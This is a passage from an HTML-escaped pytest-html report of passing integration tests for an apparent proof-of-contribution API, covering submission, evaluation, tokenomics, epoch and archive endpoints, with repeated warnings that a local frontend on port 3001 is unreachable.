NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146594f30&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_api_response_format_validation:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_api_response_format_validation:test_framework.py:390 Testing API response format validation\nINFO     TestPoCAPI.test_api_response_format_validation:test_framework.py:390 \u2705 API response format validation completed\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_archive_contributions&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_archive_contributions&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_archive_contributions&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_archive_contributions - PASSED\nDuration: 1.02s\nCategory: integration\nMetrics:\n  contributions_count: 1\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:28,551 - TestPoCAPI.test_archive_contributions - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460aebe0&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:28,553 - TestPoCAPI.test_archive_contributions - INFO - Found 1 existing contributions\n2025-12-18 09:24:28,553 - TestPoCAPI.test_archive_contributions - INFO - Testing archive contributions endpoint\n2025-12-18 09:24:28,555 - TestPoCAPI.test_archive_contributions - INFO - Found 1 contributions\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_archive_contributions:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460aebe0&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_archive_contributions:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_archive_contributions:test_framework.py:390 Testing archive contributions endpoint\nINFO     TestPoCAPI.test_archive_contributions:test_framework.py:390 Found 1 contributions\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_archive_statistics&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_archive_statistics&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_archive_statistics&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_archive_statistics - PASSED\nDuration: 1.01s\nCategory: integration\nMetrics:\n  total_contributions: 1\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:29,563 - TestPoCAPI.test_archive_statistics - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460ae580&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:29,565 - TestPoCAPI.test_archive_statistics - INFO - Found 1 existing contributions\n2025-12-18 09:24:29,565 - TestPoCAPI.test_archive_statistics - INFO - Testing archive statistics endpoint\n2025-12-18 09:24:29,567 - TestPoCAPI.test_archive_statistics - INFO - Total contributions: 1\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_archive_statistics:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460ae580&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_archive_statistics:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_archive_statistics:test_framework.py:390 Testing archive statistics endpoint\nINFO     TestPoCAPI.test_archive_statistics:test_framework.py:390 Total contributions: 1\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_certificate_generation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_certificate_generation&#34;, &#34;duration&#34;: &#34;00:00:06&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_certificate_generation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:06&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_certificate_generation - PASSED\nDuration: 6.03s\nCategory: integration\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:30,580 - TestPoCAPI.test_certificate_generation - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146580270&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:30,582 - TestPoCAPI.test_certificate_generation - INFO - Found 1 existing contributions\n2025-12-18 09:24:30,582 - TestPoCAPI.test_certificate_generation - INFO - Testing certificate generation endpoint\n2025-12-18 09:24:30,585 - TestPoCAPI.test_certificate_generation - INFO - Found 1 existing contributions\n2025-12-18 09:24:35,595 - TestPoCAPI.test_certificate_generation - INFO - Creating mock evaluated contribution for certificate testing\n2025-12-18 09:24:35,598 - TestPoCAPI.test_certificate_generation - INFO - \u26a0\ufe0f  Certificate generation not available (PDF generator not installed)\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_certificate_generation:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146580270&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_certificate_generation:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_certificate_generation:test_framework.py:390 Testing certificate generation endpoint\nINFO     TestPoCAPI.test_certificate_generation:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_certificate_generation:test_framework.py:390 Creating mock evaluated contribution for certificate testing\nINFO     TestPoCAPI.test_certificate_generation:test_framework.py:390 \u26a0\ufe0f  Certificate generation not available (PDF generator not installed)\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_contribution_details&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_contribution_details&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_contribution_details&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_contribution_details - PASSED\nDuration: 1.02s\nCategory: integration\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:36,618 - TestPoCAPI.test_contribution_details - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146581040&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:36,620 - TestPoCAPI.test_contribution_details - INFO - Found 1 existing contributions\n2025-12-18 09:24:36,620 - TestPoCAPI.test_contribution_details - INFO - Testing contribution details endpoint\n2025-12-18 09:24:36,624 - TestPoCAPI.test_contribution_details - INFO - \u2705 Retrieved details for contribution: Fractal Cognitive Chemistry: From Awareness to Generative AI\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_contribution_details:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146581040&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_contribution_details:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_contribution_details:test_framework.py:390 Testing contribution details endpoint\nINFO     TestPoCAPI.test_contribution_details:test_framework.py:390 \u2705 Retrieved details for contribution: Fractal Cognitive Chemistry: From Awareness to Generative AI\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_debug_tokenomics&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_debug_tokenomics&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_debug_tokenomics&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_debug_tokenomics - PASSED\nDuration: 1.02s\nCategory: integration\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:37,641 - TestPoCAPI.test_debug_tokenomics - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460ae580&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:37,643 - TestPoCAPI.test_debug_tokenomics - INFO - Found 1 existing contributions\n2025-12-18 09:24:37,643 - TestPoCAPI.test_debug_tokenomics - INFO - Testing debug tokenomics state endpoint\n2025-12-18 09:24:37,644 - TestPoCAPI.test_debug_tokenomics - INFO - \u2705 Debug tokenomics state retrieved\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_debug_tokenomics:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460ae580&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_debug_tokenomics:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_debug_tokenomics:test_framework.py:390 Testing debug tokenomics state endpoint\nINFO     TestPoCAPI.test_debug_tokenomics:test_framework.py:390 \u2705 Debug tokenomics state retrieved\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_epoch_info&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_epoch_info&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_epoch_info&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_epoch_info - PASSED\nDuration: 1.02s\nCategory: integration\nMetrics:\n  current_epoch: founder\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:38,660 - TestPoCAPI.test_epoch_info - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460af460&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:38,663 - TestPoCAPI.test_epoch_info - INFO - Found 1 existing contributions\n2025-12-18 09:24:38,663 - TestPoCAPI.test_epoch_info - INFO - Testing epoch info endpoint\n2025-12-18 09:24:38,666 - TestPoCAPI.test_epoch_info - INFO - Current epoch: founder (Founder)\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_epoch_info:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460af460&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_epoch_info:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_epoch_info:test_framework.py:390 Testing epoch info endpoint\nINFO     TestPoCAPI.test_epoch_info:test_framework.py:390 Current epoch: founder (Founder)\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_evaluate_contribution&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_evaluate_contribution&#34;, &#34;duration&#34;: &#34;00:00:02&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_evaluate_contribution&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:02&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_evaluate_contribution - PASSED\nDuration: 2.04s\nCategory: integration\nMetrics:\n  evaluation_metals: [&amp;#x27;gold&amp;#x27;]\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:39,678 - TestPoCAPI.test_evaluate_contribution - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1465806b0&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:39,680 - TestPoCAPI.test_evaluate_contribution - INFO - Found 1 existing contributions\n2025-12-18 09:24:39,680 - TestPoCAPI.test_evaluate_contribution - INFO - Testing contribution evaluation endpoint\n2025-12-18 09:24:39,682 - TestPoCAPI.test_evaluate_contribution - INFO - Evaluating contribution: b1d9a91c9982ffa4dc06390187f559abad839691c8c8a6354085a144d73dfc6f\n2025-12-18 09:24:40,710 - TestPoCAPI.test_evaluate_contribution - INFO - \u2705 Evaluation successful, metals: [&amp;#x27;gold&amp;#x27;]\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_evaluate_contribution:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1465806b0&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_evaluate_contribution:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_evaluate_contribution:test_framework.py:390 Testing contribution evaluation endpoint\nINFO     TestPoCAPI.test_evaluate_contribution:test_framework.py:390 Evaluating contribution: b1d9a91c9982ffa4dc06390187f559abad839691c8c8a6354085a144d73dfc6f\nINFO     TestPoCAPI.test_evaluate_contribution:test_framework.py:390 \u2705 Evaluation successful, metals: [&amp;#x27;gold&amp;#x27;]\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_health_endpoint&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_health_endpoint&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_health_endpoint&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_health_endpoint - PASSED\nDuration: 1.02s\nCategory: integration\nMetrics:\n  response_time: 0.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:41,725 - TestPoCAPI.test_health_endpoint - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146580d10&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:41,727 - TestPoCAPI.test_health_endpoint - INFO - Found 1 existing contributions\n2025-12-18 09:24:41,727 - TestPoCAPI.test_health_endpoint - INFO - Testing /health endpoint\n2025-12-18 09:24:41,728 - TestPoCAPI.test_health_endpoint - INFO - \u2705 Health endpoint working\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_health_endpoint:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146580d10&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_health_endpoint:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_health_endpoint:test_framework.py:390 Testing /health endpoint\nINFO     TestPoCAPI.test_health_endpoint:test_framework.py:390 \u2705 Health endpoint working\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_register_poc&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_register_poc&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_register_poc&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_register_poc - PASSED\nDuration: 1.02s\nCategory: integration\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:42,740 - TestPoCAPI.test_register_poc - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460af8a0&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:42,744 - TestPoCAPI.test_register_poc - INFO - Found 1 existing contributions\n2025-12-18 09:24:42,744 - TestPoCAPI.test_register_poc - INFO - Testing PoC registration endpoint\n2025-12-18 09:24:42,747 - TestPoCAPI.test_register_poc - INFO - \u26a0\ufe0f  PoC registration returned 400 (validation/authentication)\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_register_poc:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460af8a0&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_register_poc:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_register_poc:test_framework.py:390 Testing PoC registration endpoint\nINFO     TestPoCAPI.test_register_poc:test_framework.py:390 \u26a0\ufe0f  PoC registration returned 400 (validation/authentication)\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_sandbox_map&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_sandbox_map&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_sandbox_map&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_sandbox_map - PASSED\nDuration: 1.02s\nCategory: integration\nMetrics:\n  sandbox_nodes: 1\n  sandbox_edges: 0\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:43,768 - TestPoCAPI.test_sandbox_map - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460ae580&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:43,770 - TestPoCAPI.test_sandbox_map - INFO - Found 1 existing contributions\n2025-12-18 09:24:43,771 - TestPoCAPI.test_sandbox_map - INFO - Testing sandbox map endpoint\n2025-12-18 09:24:43,772 - TestPoCAPI.test_sandbox_map - INFO - Sandbox map has 1 nodes and 0 edges\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_sandbox_map:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1460ae580&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_sandbox_map:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_sandbox_map:test_framework.py:390 Testing sandbox map endpoint\nINFO     TestPoCAPI.test_sandbox_map:test_framework.py:390 Sandbox map has 1 nodes and 0 edges\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_submit_contribution&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_submit_contribution&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_submit_contribution&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_submit_contribution - PASSED\nDuration: 1.03s\nCategory: integration\nMetrics:\n  submission_hash: 9f6cbb5f2bf071ce87a64fbe5472e222323ad41703494d0a68b2681b43aa8391\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:44,794 - TestPoCAPI.test_submit_contribution - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146580050&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:44,798 - TestPoCAPI.test_submit_contribution - INFO - Found 1 existing contributions\n2025-12-18 09:24:44,798 - TestPoCAPI.test_submit_contribution - INFO - Testing contribution submission endpoint\n2025-12-18 09:24:44,807 - TestPoCAPI.test_submit_contribution - INFO - \u2705 Submission successful, hash: 9f6cbb5f2bf071ce87a64fbe5472e222323ad41703494d0a68b2681b43aa8391\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_submit_contribution:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146580050&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_submit_contribution:test_framework.py:390 Found 1 existing contributions\nINFO     TestPoCAPI.test_submit_contribution:test_framework.py:390 Testing contribution submission endpoint\nINFO     TestPoCAPI.test_submit_contribution:test_framework.py:390 \u2705 Submission successful, hash: 9f6cbb5f2bf071ce87a64fbe5472e222323ad41703494d0a68b2681b43aa8391\n\n&#34;}], &#34;tests/test_poc_api.py::TestPoCAPI::test_tokenomics_statistics&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_poc_api.py::TestPoCAPI::test_tokenomics_statistics&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_poc_api.py::TestPoCAPI::test_tokenomics_statistics&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_tokenomics_statistics - PASSED\nDuration: 1.01s\nCategory: integration\nMetrics:\n  total_allocated: 0.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:45,819 - TestPoCAPI.test_tokenomics_statistics - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146580af0&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:24:45,821 - 